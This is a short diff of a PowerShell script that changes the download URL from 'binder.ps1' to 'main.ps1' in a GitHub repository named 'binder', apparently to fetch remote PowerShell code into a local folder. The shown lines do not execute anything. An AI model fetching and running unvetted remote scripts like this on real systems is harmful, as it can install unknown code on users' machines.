@@ -1,5 +1,5 @@
 # Define the URL to download the content from
-$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/binder.ps1"
+$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/main.ps1"
 
 # Create the directory if it doesn't exist
 $directoryPath = ".\fileinhere"
